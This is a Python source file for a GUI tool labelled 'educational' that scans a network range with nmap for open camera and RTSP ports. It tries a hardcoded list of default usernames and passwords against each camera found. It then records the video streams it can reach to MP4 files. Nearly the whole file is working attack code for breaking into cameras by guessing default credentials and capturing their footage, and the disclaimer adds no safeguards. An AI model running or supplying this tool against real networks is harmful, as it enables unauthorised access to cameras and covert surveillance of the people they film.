#!/usr/bin/env python3
"""
CCTV Stream Scanner - Educational Tool
⚠️ For educational and ethical use only
"""

import nmap
import socket
import threading
import time
import logging
from datetime import datetime
import tkinter as tk
from tkinter import ttk, messagebox
import cv2
import rtsp
from scapy.all import *
import os
from colorama import init, Fore, Style

# Initialize colorama
init()

# Configure logging
logging.basicConfig(
    filename=f'cctv_scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class CCTVScanner:
    def __init__(self):
        self.discovered_cameras = []
        self.scanning = False
        self.default_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('root', 'root'),
            ('root', 'password'),
            ('admin', '12345'),
            ('admin', '123456')
        ]
        
    def scan_port(self, ip, port):
        """Scan a specific port on an IP address"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                return True
            return False
        except:
            return False
        finally:
            sock.close()

    def scan_network(self, network_range, ports=[554, 8554, 8000, 8080]):
        """Scan network range for open RTSP ports"""
        self.scanning = True
        self.discovered_cameras = []
        
        nm = nmap.PortScanner()
        try:
            # Scan the network range
            nm.scan(hosts=network_range, arguments=f'-p {",".join(map(str, ports))} -T4')
            
            for host in nm.all_hosts():
                if self.scanning:  # Check if scanning should continue
                    for port in ports:
                        if nm[host].has_tcp(port) and nm[host]['tcp'][port]['state'] == 'open':
                            camera_info = {
                                'ip': host,
                                'port': port,
                                'credentials': None,
                                'stream_url': None
                            }
                            
                            # Try to connect with default credentials
                            for username, password in self.default_credentials:
                                rtsp_url = f'rtsp://{username}:{password}@{host}:{port}/'
                                try:
                                    client = rtsp.Client(rtsp_url, timeout=1)
                                    if client:
                                        camera_info['credentials'] = (username, password)
                                        camera_info['stream_url'] = rtsp_url
                                        break
                                except:
                                    continue
                            
                            self.discovered_cameras.append(camera_info)
                            logging.info(f"Discovered camera at {host}:{port}")
                            
        except Exception as e:
            logging.error(f"Error during network scan: {str(e)}")
            print(f"{Fore.RED}Error during network scan: {str(e)}{Style.RESET_ALL}")
        
        self.scanning = False
        return self.discovered_cameras

    def capture_stream(self, rtsp_url, output_file, duration=10):
        """Capture video stream for specified duration"""
        try:
            cap = cv2.VideoCapture(rtsp_url)
            if not cap.isOpened():
                raise Exception("Failed to open stream")

            # Get video properties
            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
            fps = int(cap.get(cv2.CAP_PROP_FPS))

            # Create video writer
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(output_file, fourcc, fps, (width, height))

            start_time = time.time()
            while (time.time() - start_time) < duration:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                else:
                    break

            cap.release()
            out.release()
            logging.info(f"Successfully captured stream to {output_file}")
            return True

        except Exception as e:
            logging.error(f"Error capturing stream: {str(e)}")
            print(f"{Fore.RED}Error capturing stream: {str(e)}{Style.RESET_ALL}")
            return False

class ScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("CCTV Stream Scanner - Educational Tool")
        self.scanner = CCTVScanner()
        self.setup_gui()

    def setup_gui(self):
        # Network range input
        ttk.Label(self.root, text="Network Range (e.g., 192.168.1.0/24):").pack(pady=5)
        self.network_range = ttk.Entry(self.root, width=40)
        self.network_range.pack(pady=5)
        self.network_range.insert(0, "192.168.1.0/24")

        # Scan button
        self.scan_button = ttk.Button(self.root, text="Start Scan", command=self.start_scan)
        self.scan_button.pack(pady=10)

        # Results treeview
        self.tree = ttk.Treeview(self.root, columns=("IP", "Port", "Credentials", "Status"), show="headings")
        self.tree.heading("IP", text="IP Address")
        self.tree.heading("Port", text="Port")
        self.tree.heading("Credentials", text="Credentials")
        self.tree.heading("Status", text="Status")
        self.tree.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)

        # Capture button
        self.capture_button = ttk.Button(self.root, text="Capture Selected Stream", command=self.capture_selected)
        self.capture_button.pack(pady=10)
        self.capture_button.config(state=tk.DISABLED)

    def start_scan(self):
        self.scan_button.config(state=tk.DISABLED)
        self.tree.delete(*self.tree.get_children())
        
        def scan_thread():
            network_range = self.network_range.get()
            cameras = self.scanner.scan_network(network_range)
            
            for camera in cameras:
                credentials = f"{camera['credentials'][0]}:{camera['credentials'][1]}" if camera['credentials'] else "Not found"
                status = "Accessible" if camera['credentials'] else "Inaccessible"
                self.tree.insert("", tk.END, values=(camera['ip'], camera['port'], credentials, status))
            
            self.scan_button.config(state=tk.NORMAL)
            self.capture_button.config(state=tk.NORMAL)

        threading.Thread(target=scan_thread, daemon=True).start()

    def capture_selected(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Please select a camera from the list")
            return

        item = self.tree.item(selected[0])
        ip = item['values'][0]
        port = item['values'][1]
        
        # Find the camera in discovered_cameras
        camera = next((c for c in self.scanner.discovered_cameras if c['ip'] == ip and c['port'] == port), None)
        
        if camera and camera['stream_url']:
            output_file = f"capture_{ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
            if self.scanner.capture_stream(camera['stream_url'], output_file):
                messagebox.showinfo("Success", f"Stream captured to {output_file}")
            else:
                messagebox.showerror("Error", "Failed to capture stream")
        else:
            messagebox.showwarning("Warning", "No valid stream URL found for selected camera")

def main():
    root = tk.Tk()
    app = ScannerGUI(root)
    root.geometry("800x600")
    root.mainloop()

if __name__ == "__main__":
    main() 